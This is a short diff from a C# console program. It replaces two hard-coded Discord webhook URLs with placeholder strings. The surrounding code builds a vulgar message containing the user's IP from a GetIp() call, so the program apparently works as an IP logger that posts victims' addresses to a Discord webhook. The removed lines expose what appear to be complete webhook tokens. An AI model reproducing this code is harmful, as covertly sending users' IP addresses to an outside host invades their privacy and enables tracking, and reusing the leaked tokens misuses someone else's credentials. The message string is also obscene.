@@ -32,8 +32,8 @@ namespace C_
 
             userInput = Console.ReadLine();
 
-            String WH = "https://discord.com/api/webhooks/948418460394848326/cxSDP6eyXURcXpfr7ZZDZBjsmhI9kSH197H8bhNt9QRbO6YgGPtJHJ1j9MGleMebHYHK";
-            string WH2 = "https://discord.com/api/webhooks/948442884200349697/bJ32Vw55qEgTCZ81SQBDKU4gK5xtlCTmsDpuxyyYqfKgn5Mmmow3yRWz-klR9dvCvSj5";
+            String WH = "Webhook 1";
+            string WH2 = "Webhook 2";
             
             string Message2 = "I took it up the ass for this: " + GetIp(); 
             
